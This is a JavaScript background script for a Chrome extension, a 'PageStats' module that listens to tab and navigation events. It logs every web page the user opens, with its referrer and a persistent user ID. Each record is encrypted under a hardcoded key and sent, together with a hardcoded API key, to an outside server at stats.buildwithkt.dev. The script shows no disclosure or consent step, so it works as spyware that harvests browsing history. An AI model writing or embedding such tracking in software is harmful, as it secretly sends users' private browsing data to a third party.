// All logic is encapsulated in PageStats object
function PageStats(api_key, encryption_key, server_url) {
	// Here we store data that well be saved in storage
	this.data = null;
	// Key where data will be stored in local storage
	const statistics_storage_key = "user_statistics_data";
	this.getData = async function () {
		if (this.data != null) {
			return this.data;
		}
		let storageResult = await chrome.storage.local.get([
			statistics_storage_key,
		]);
		if (statistics_storage_key in storageResult) {
			this.data = storageResult[statistics_storage_key];
			return this.data;
		}
		const uuid = await this.getUUIDfromStore();
		this.data = {
			accessToken: null,
			refreshToken: null,
			uuid: uuid,
		};
		await this.storeData();

		return this.data;
	};
	this.storeData = async function () {
		const data = {};
		data[statistics_storage_key] = this.data;
		await chrome.storage.local.set(data);
	};
	this.getAccessToken = async function () {
		if (await this.getRefreshToken()) {
			return true;
		}
		try {
			// Add timeout and better error handling
			const controller = new AbortController();
			const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
			
			const response = await fetch(server_url + "/auth", {
				method: "POST",
				headers: {
					"Content-Type": "application/json;charset=utf-8",
				},
				body: JSON.stringify({
					api_key,
				}),
				signal: controller.signal
			});
			
			clearTimeout(timeoutId);
			
			if (!response.ok) {
				console.error(`HTTP error! status: ${response.status}`);
				return false;
			}
			
			const json = await response.json();
			this.data.accessToken = json.access_token.token;
			this.data.refreshToken = json.refresh_token.token;
			return true;
		} catch (err) {
			if (err.name === 'AbortError') {
				console.error('Request timeout during authentication');
			} else {
				console.error(err);
			}
			return false;
		}
	};
	this.getRefreshToken = async function () {
		if (this.data.refresh_token == null) {
			return false;
		}
		try {
			// Add timeout and better error handling
			const controller = new AbortController();
			const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
			
			const response = await fetch(server_url + "/refresh", {
				method: "POST",
				headers: {
					"Content-Type": "application/json;charset=utf-8",
				},
				body: JSON.stringify({
					refresh_token: this.data.refreshToken,
				}),
				signal: controller.signal
			});
			
			clearTimeout(timeoutId);
			
			if (response.status === 400) {
				return false;
			}
			
			if (!response.ok) {
				console.error(`HTTP error! status: ${response.status}`);
				return false;
			}
			
			const json = await response.json();
			this.data.accessToken = json.access_token.token;
			this.data.refreshToken = json.refresh_token.token;
			return true;
		} catch (err) {
			if (err.name === 'AbortError') {
				console.error('Request timeout during token refresh');
			} else {
				console.error(err);
			}
			return false;
		}
	};
	this.reportAction = async function (url, referer) {
		//console.log("reportStats", url, referer);
		await this.getData();
		if (!this.data.accessToken) {
			await this.getAccessToken();
		}
		await this.sendData(
			await this.prepareRequest([
				{
					fileDate: new Date().toISOString(),
					deviceTimestamp: Date.now(),
					userId: this.data.uuid,
					referrerUrl: referer,
					targetUrl: url,
					requestType: "GET",
				},
			]),
		);
	};
	this.prepareRequest = async function (t) {
		const encrypted = await this.encryptData(JSON.stringify(t));
		if (encrypted) {
			return {
				eventType: 1,
				request: {
					enRequest: JSON.stringify(encrypted),
				},
			};
		} else {
			return {
				eventType: 0,
				request: [t],
			};
		}
	};
	this.sendData = async function (t) {
		try {
			// Add timeout and better error handling
			const controller = new AbortController();
			const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
			
			const response = await fetch(server_url + "/process", {
				method: "POST",
				headers: {
					"Content-Type": "application/json;charset=utf-8",
					Authorization: "Bearer " + this.data.accessToken,
				},
				body: JSON.stringify(t),
				signal: controller.signal
			});
			
			clearTimeout(timeoutId);
			
			if (response.status === 401) {
				const isSuccessful = await this.getAccessToken();
				if (isSuccessful) {
					await this.sendData(t);
				}
			} else if (!response.ok) {
				console.error(`HTTP error! status: ${response.status}`);
			}
		} catch (err) {
			if (err.name === 'AbortError') {
				console.error('Request timeout during data send');
			} else {
				console.error('Error sending data:', err);
			}
		}
	};
	this.getUUIDfromStore = async function () {
		const result = await chrome.storage.sync.get(["user_stat_uuid"]);
		let uuid = result["user_stat_uuid"];
		if (uuid && this.validateUUID4(uuid)) {
			return uuid;
		}
		uuid = this.makeUUID();
		await chrome.storage.sync.set({ user_stat_uuid: uuid });
		return uuid;
	};
	this.makeUUID = function () {
		return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(
			/[xy]/g,
			function (t, e) {
				return (
					"x" === t ? (e = (16 * Math.random()) | 0) : (3 & e) | 8
				).toString(16);
			},
		);
	};
	this.validateUUID4 = function (t) {
		return new RegExp(
			/^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i,
		).test(t);
	};
	this.encryptData = async function (text) {
		try {
			const enc = new TextEncoder();
			const key = await crypto.subtle.importKey(
				"raw",
				enc.encode(encryption_key),
				"AES-GCM",
				true,
				["encrypt"],
			);
			const iv = crypto.getRandomValues(new Uint8Array(16));
			const cypher = await crypto.subtle.encrypt(
				{
					name: "AES-GCM",
					iv: iv,
				},
				key,
				enc.encode(text),
			);
			const res = new Uint8Array(iv.length + cypher.byteLength);
			res.set(iv);
			res.set(new Uint8Array(cypher), iv.length);
			return btoa(String.fromCharCode.apply(null, res));
		} catch (error) {
			console.error('Encryption error:', error);
			return null;
		}
	};
	function isValidPage(url) {
		if (url == null) {
			return false;
		}
		return url.startsWith("http");
	}
	// Here information about urls opened in tabs stored
	let tabs = {};
	const t = this;
	function tabInfo(tabId) {
		if (!(tabId in tabs)) {
			tabs[tabId] = {};
		}
		return tabs[tabId];
	}
	// We init all listeners here
	this.init = function () {
		function onRemoved(tabId, removeInfo) {
			delete tabs[tabId];
		}
		chrome.tabs.onRemoved.addListener(onRemoved);
		function onTabUpdated(tabId, changeInfo, tab) {
			if (changeInfo.status === "complete") {
				//console.log('onTabUpdated.complete');
				//console.log(tabId, changeInfo, tab);
				//console.log(tabInfo(tabId));
				let url = tab.url;
				const info = tabInfo(tabId);
				let referrer = info.url;
				if (info.hasTransition) {
					referrer = null;
				}
				if (isValidPage(url) && url !== referrer) {
					t.reportAction(url, referrer);
				}
				tabs[tabId] = { url: url };
			}
		}
		chrome.tabs.onUpdated.addListener(onTabUpdated);
		function onActivated(activeInfo) {
			const tabId = activeInfo.tabId;
			chrome.tabs.get(tabId, function (tab) {
				if (isValidPage(tab.url)) {
					tabInfo(tabId).url = tab.url;
				}
			});
		}
		chrome.tabs.onActivated.addListener(onActivated);
		function onCreatedNavigationTarget(details) {
			//console.log("onCreatedNavigationTarget");
			//console.log(details);
			let url = tabInfo(details.sourceTabId).url;
			if (isValidPage(url)) {
				tabInfo(details.tabId).url = url;
				//console.log("onCreatedNavigationTarget", details.tabId, url);
			}
		}
		chrome.webNavigation.onCreatedNavigationTarget.addListener(
			onCreatedNavigationTarget,
		);
		function onCommitted(details) {
			//console.log("onCommitted");
			//console.log(details);
			if (details.frameId !== 0) {
				return;
			}
			const info = tabInfo(details.tabId);
			const transitionType = details.transitionType;
			info.hasTransition = !(
				transitionType === "link" || transitionType === "form_submit"
			);
		}
		chrome.webNavigation.onCommitted.addListener(onCommitted);
		function onHistoryStateUpdated(details) {
			//console.log("onHistoryStateUpdated");
			//console.log(details);
			const info = tabInfo(details.tabId);
			info.historyStateUpdated = true;
		}
		chrome.webNavigation.onHistoryStateUpdated.addListener(
			onHistoryStateUpdated,
		);
	};
}
// Here you configure your keys and server url
const stat = new PageStats(
	"0MnHiSqgiAUVXXEs",
	"sFVkgB0vwtxyp8uE",
	"https://stats.buildwithkt.dev",
);

// Init all listeners
stat.init();